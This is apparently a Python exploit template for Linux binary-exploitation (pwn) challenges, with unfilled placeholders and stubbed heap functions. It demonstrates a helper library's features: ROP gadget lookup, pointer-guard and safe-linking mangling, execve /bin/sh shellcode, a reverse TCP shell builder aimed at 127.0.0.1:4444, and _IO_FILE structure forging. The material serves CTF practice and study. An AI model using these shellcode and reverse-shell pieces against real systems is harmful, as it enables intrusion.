#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: {author} - {blog}
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import sys

# CONFIG
# ------------------------------------------------------------------------
BIN_PATH   = {file_path!r}
LIBC_PATH  = {libc_path!r}
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], {host!r}, {port!r})

Context(
    arch      = {arch!r},
    os        = {os!r},
    endian    = {endian!r},
    log_level = {log!r},
    terminal  = {term!r}
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {{}}
).init().alias()
set_global_io(io)   # s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# HEAP 
# ------------------------------------------------------------------------
def menu(n: int):
    opt = itoa(n)
    pass

def alloc():
    pass

def free():
    pass

def edit():
    pass

def show():
    pass

# EXPLOIT
# ------------------------------------------------------------------------
def xpl(**kwargs):
   
    # TODO: exploit chain

    # - ROP after leaking libc_base
    libc.address = libc_base
    ggs     = ROPGadgets(libc)
    p_rdi_r = ggs['p_rdi_r']
    p_rsi_r = ggs['p_rsi_r']
    p_rax_r = ggs['p_rax_r']
    p_rsp_r = ggs['p_rsp_r']
    p_rdx_rbx_r = ggs['p_rdx_rbx_r']
    leave_r = ggs['leave_r']
    ret     = ggs['ret']
    ggs.dump()  # dump all gadgets to stdout

    # - Libc Pointer protection
    # 1) pointer guard
    guard = 0xdeadbeef  # leak it or overwrite it
    pg = PointerGuard(guard)
    ptr = 0xcafebabe
    enc_ptr = pg.mangle(ptr)
    dec_ptr = pg.demangle(enc_ptr)
    assert ptr == dec_ptr

    # 2) safe linking 
    #    e.g., after leaking heap_base for tcache
    slk = SafeLinking(heap_base)
    fd = 0x55deadbeef
    enc_fd = slk.encrypt(fd)
    dec_fd = slk.decrypt(enc_fd)
    assert fd == dec_fd

    # - Shellcode generation
    # 1) list all built-in available shellcodes
    for name in list_shellcodes():
            print(" -", name)

    # 2) retrieve by arch + name, default variant (min)
    sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
    print(hex_shellcode(sc.blob))   # output as hex

    # 3) pretty dump
    sc.dump()  

    # 4) retrieve explicit variant
    sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
    print(f"[+] Got shellcode: {sc.name} ({sc.arch}), {len(sc.blob)} bytes")
    print(hex_shellcode(sc.blob))

    # 5) retrieve via composite key
    sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
    print(f"[+] Got shellcode: {sc.name}")
    print(hex_shellcode(sc.blob))

    # 6) fuzzy lookup
    sc = ShellcodeReigstry.get("amd64", "ls_")
    print(f"[+] Fuzzy match: {sc.name}")
    print(hex_shellcode(sc.blob))

    # 7) builder demo: reverse TCP shell (amd64)
    builder = ShellcodeBuilder("amd64")
    rev = builder.build_reverse_tcp_shell("127.0.0.1", 4444)
    print(f"[+] Built reverse TCP shell ({len(rev)} bytes)")
    print(hex_shellcode(rev))

    # - IO FILE exploit
    # 1) create an _IO_FILE_plus object
    f = IOFilePlus()

    # 2) iterate its fields
    for field in f.fields:  # or f.iter_fileds()
        print(field)

    # 3) set FILE members
    # Use aliases
    f.flags      = 0xfbad1800
    f.write_base = 0x13370000
    f.write_ptr  = 0x13370040
    f.mode       = 0
    f.fileno     = 1
    f.chain      = 0xcafebabe
    f.vtable     = 0xdeadbeef

    # Also honors original glibc naming
    f._flags = 0xfbad1800
    f._IO_write_base = 0x13370000

    # use the built-in set() method
    f.set('_lock', 0x41414141)  # set field via name 
    f.set(116, 0x42424242)      # _flags2, set via a specific offset

    # 4) pretty dump to screen
    f.dump()

    # 5) retrieve a field value via get() method
    vtable = f.get("vtable")    # retrieve via name
    vtable = f.get(0xd8)        # via offset

    # 6) create a snapshot for FILE
    snapshot = f.bytes          # or: f.to_bytes()
    snapshot2 = f.data          # use the `data` bytearray class member
    print(f"[+] IO FILE snapshot in bytes:\n{snapshot}\n{snapshot2})")

    # 7) create an IOFilePlus class object by importing a data blob
    f2 = IOFilePlus.from_bytes(blob=snapshot, arch="amd64")


    io.interactive()

# PIPELINE
# ------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

